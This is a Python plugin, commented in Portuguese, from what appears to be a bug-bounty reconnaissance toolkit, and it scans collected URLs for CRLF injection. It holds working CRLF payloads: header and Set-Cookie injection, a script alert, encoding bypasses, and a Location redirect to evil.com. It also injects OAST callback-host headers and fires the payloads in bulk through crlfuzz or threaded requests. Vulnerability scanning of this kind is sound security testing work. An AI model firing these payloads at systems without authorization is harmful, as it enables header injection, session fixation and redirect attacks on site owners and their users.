#!/usr/bin/env python3
"""
CRLF Injection Scanner — Testa injeção de \\r\\n em parâmetros
Verifica se headers customizados aparecem na resposta HTTP
Captura raw request/response para Burp modal
"""
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote

from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_raw_request, format_raw_response

try:
    import httpx
except ImportError:
    httpx = None


# Payloads CRLF
CRLF_PAYLOADS = [
    "%0d%0aX-CRLF-Test:%20injected",
    "%0d%0aSet-Cookie:%20crlf=injected",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%0D%0AX-CRLF-Test:%20injected",
    "%E5%98%8A%E5%98%8DX-CRLF-Test:%20injected",  # Unicode bypass
    "%0d%0aLocation:%20http://evil.com",
    "%0a%20X-CRLF-Test:%20injected",  # LF-only bypass
    "%0d%20X-CRLF-Test:%20injected",  # CR-only bypass
]

# Header que indica CRLF bem-sucedido
CRLF_INDICATOR = "x-crlf-test"
COOKIE_INDICATOR = "crlf=injected"


def test_crlf(client, url, payload):
    """Testa CRLF injection em todos os parâmetros de uma URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    
    findings = []
    
    # Teste em parâmetros existentes
    for param_name in list(params.keys()):
        new_params = params.copy()
        new_params[param_name] = [payload]
        new_query = urlencode(new_params, doseq=True, quote_via=lambda s, safe, encoding=None, errors=None: s)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            resp = client.get(test_url, timeout=10, follow_redirects=False)
            
            # Verificar se header injetado apareceu na resposta
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            
            crlf_found = False
            inject_type = ""
            
            if CRLF_INDICATOR in headers_lower:
                crlf_found = True
                inject_type = "Header Injection"
            elif any(COOKIE_INDICATOR in v for v in resp.headers.get("set-cookie", "").split(";")):
                crlf_found = True
                inject_type = "Cookie Injection"
            elif "location" in headers_lower and "evil.com" in headers_lower.get("location", ""):
                crlf_found = True
                inject_type = "Header Redirect Injection"
            
            if crlf_found:
                raw_req = format_raw_request("GET", test_url, dict(resp.request.headers))
                raw_res = format_raw_response(resp.status_code, dict(resp.headers), resp.text[:2000])
                findings.append({
                    "url": url,
                    "test_url": test_url,
                    "parameter": param_name,
                    "payload": payload,
                    "type": inject_type,
                    "risk": "HIGH",
                    "status": resp.status_code,
                    "details": f"CRLF Injection via parâmetro '{param_name}' — {inject_type}",
                    "request_raw": raw_req,
                    "response_raw": raw_res,
                })
                
        except Exception:
            pass
    
    # Teste também no path
    try:
        test_path = parsed.path + payload
        test_url = urlunparse(parsed._replace(path=test_path))
        resp = client.get(test_url, timeout=10, follow_redirects=False)
        headers_lower = {k.lower(): v for k, v in resp.headers.items()}
        
        if CRLF_INDICATOR in headers_lower:
            raw_req = format_raw_request("GET", test_url, dict(resp.request.headers))
            raw_res = format_raw_response(resp.status_code, dict(resp.headers), resp.text[:2000])
            findings.append({
                "url": url,
                "test_url": test_url,
                "parameter": "PATH",
                "payload": payload,
                "type": "Path CRLF Injection",
                "risk": "HIGH",
                "status": resp.status_code,
                "details": f"CRLF Injection via path — Header injetado",
                "request_raw": raw_req,
                "response_raw": raw_res,
            })
    except Exception:
        pass
    
    return findings


def run(context: dict):
    target = context.get("target")
    if not target:
        raise ValueError("Target required")
    
    if not httpx:
        error("httpx não instalado")
        return []

    info(
        f"\n🟥───────────────────────────────────────────────────────────🟥\n"
        f"   💉  {C.BOLD}{C.CYAN}CRLF INJECTION SCANNER{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟥───────────────────────────────────────────────────────────🟥\n"
    )

    outdir = ensure_outdir(target, "crlf_injection")
    results_file = outdir / "crlf_results.json"
    
    # Carregar OAST payload (Interactsh) se existir
    oast_url = ""
    oast_file = Path("output") / target / "oast_payload.txt"
    if oast_file.exists():
        oast_url = oast_file.read_text(errors="ignore").strip()
        info(f"   [i] Injectando payload OAST automaticamente: {C.YELLOW}{oast_url}{C.END}")
        
    local_payloads = CRLF_PAYLOADS.copy()
    if oast_url:
        local_payloads.extend([
            f"%0d%0aLocation:%20http://{oast_url}",
            f"%0d%0aReferer:%20http://{oast_url}",
            f"%0d%0aHost:%20{oast_url}",
            f"%0d%0aX-Forwarded-Host:%20{oast_url}"
        ])
    
    # Carregar URLs
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "domain" / "urls_valid.txt"
    
    if not urls_file.exists():
        warn("Nenhum arquivo de URLs encontrado")
        return []
    
    raw_urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
    
    # -----------------------------------------------------
    # Deduplicação Agressiva (CRLF não precisa de 50k URLs) 
    # -----------------------------------------------------
    unique_signatures = set()
    all_urls = []
    
    for u in raw_urls:
        try:
            parsed = urlparse(u)
            host = parsed.netloc
            path = parsed.path
            
            # Signature: host + primeiros 2 diretorios + chaves de parametros
            path_parts = [p for p in path.split('/') if p][:2]
            params = tuple(sorted(parse_qs(parsed.query).keys()))
            sig = (host, tuple(path_parts), params)
            
            if sig not in unique_signatures:
                unique_signatures.add(sig)
                all_urls.append(u)
                
                # Cap global de 3000 URLs pra evitar lentidão absurda
                if len(all_urls) >= 3000:
                    break
        except:
            pass
            
    info(f"   [i] URLs reduzidas via deduplicação agressiva: {len(raw_urls)} -> {len(all_urls)}")
    
    # -----------------------------------------------------
    # Execução do crlfuzz (Rápido e Preciso em Go)
    # -----------------------------------------------------
    import shutil
    import subprocess
    crlfuzz = shutil.which("crlfuzz")
    
    if crlfuzz:
        info(f"   [i] Utilizando {C.BOLD}crlfuzz{C.END} (Go) para detecção rápida e massiva...")
        crlfuzz_out = outdir / "crlfuzz_raw.txt"
        
        total_urls = len(all_urls)
        chunk_size = 200
        chunks = [all_urls[i:i + chunk_size] for i in range(0, total_urls, chunk_size)]
        
        deduped = []
        done_count = 0
        seen_urls = set()
        temp_file = outdir / "temp_crlf_urls.txt"
        
        for chunk in chunks:
            temp_file.write_text("\n".join(chunk))
            
            cmd = [crlfuzz, "-l", str(temp_file), "-s", "-o", str(crlfuzz_out)]
            # Usa -s silent pra suprimir output nativo
            try:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=45)
            except subprocess.TimeoutExpired:
                # Servidor engasgou a conexão do crlfuzz (comun em bloqueios stealth)
                pass
            
            if crlfuzz_out.exists() and crlfuzz_out.stat().st_size > 0:
                for line in crlfuzz_out.read_text(errors="ignore").splitlines():
                    if not line.strip(): continue
                    url_found = line.replace("[VULN]", "").strip()
                    
                    if url_found not in seen_urls:
                        seen_urls.add(url_found)
                        deduped.append({
                            "url": url_found,
                            "payload": "CRLFuzz Default",
                            "type": "CRLF Injection via crlfuzz",
                            "risk": "HIGH",
                            "details": "Detecção automática via CRLFuzz",
                        })
                        print(" " * 80, end="\r")
                        info(f"   🚨 {C.RED}CRLFuzz encontrou:{C.END} {url_found}")
                
                # Reseta para o próximo chunk
                crlfuzz_out.unlink()
                
            done_count += len(chunk)
            pct = int((done_count / total_urls) * 100) if total_urls > 0 else 100
            print(f"   [Total: {total_urls} | Atual: {done_count}] {pct}% completo... ({len(deduped)} encontrados)", end="\r")
        
        print("\n") # Quebra de linha apos o progress bar
        if temp_file.exists(): temp_file.unlink()
        
        results_file.write_text(json.dumps(deduped, indent=2, ensure_ascii=False))
        if deduped:
            success(f"💉 {len(deduped)} CRLF Injections encontrados pelo crlfuzz!")
        else:
            success("✅ Nenhuma CRLF Injection detectada pelo crlfuzz")
        return [str(results_file)]

    # -----------------------------------------------------
    # Fallback: Execução em Python (se crlfuzz não existir)
    # -----------------------------------------------------
    warn("⚠️ 'crlfuzz' não encontrado no sistema. Rodando fallback engine em Python...")
    
    # Filtrar URLs que têm parâmetros
    testable = [u for u in all_urls if "?" in u]
    
    # Adicionar URLs sem parâmetros (testar no path)
    no_params = [u for u in all_urls if "?" not in u][:50]
    testable.extend(no_params)
    
    testable = testable[:150]
    
    if not testable:
        info("Nenhuma URL encontrada para testar no fallback")
        results_file.write_text("[]")
        return [str(results_file)]
    
    info(f"   📊 Testando {len(testable)} URLs via Script...")
    
    all_findings = []
    
    with httpx.Client(verify=False, follow_redirects=False, timeout=10) as client:
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for url in testable:
                for payload in local_payloads:
                    future = executor.submit(test_crlf, client, url, payload)
                    futures[future] = url
            
            total_tasks = len(futures)
            done_count = 0
            
            for future in as_completed(futures):
                done_count += 1
                if done_count % 5 == 0 or done_count == total_tasks:
                    pct = int((done_count / total_tasks) * 100) if total_tasks > 0 else 100
                    print(f"   [Total: {total_tasks} payloads | Atual: {done_count}] {pct}% completo... ({len(all_findings)} encontrados)", end="\r")
                    
                try:
                    results = future.result()
                    if results:
                        all_findings.extend(results)
                        url = futures[future]
                        print(" " * 80, end="\r")
                        info(f"   🚨 {C.RED}CRLF: {url}{C.END}")
                except Exception:
                    pass
            print("") # Quebra de linha pro fim do chunk
    
    # Deduplicar
    seen = set()
    deduped = []
    for f in all_findings:
        key = (f["url"], f["parameter"], f["type"])
        if key not in seen:
            seen.add(key)
            deduped.append(f)
    
    results_file.write_text(json.dumps(deduped, indent=2, ensure_ascii=False))
    
    if deduped:
        success(f"💉 {len(deduped)} CRLF Injections encontrados no script!")
    else:
        success("✅ Nenhuma CRLF Injection detectada no script")
    
    return [str(results_file)]
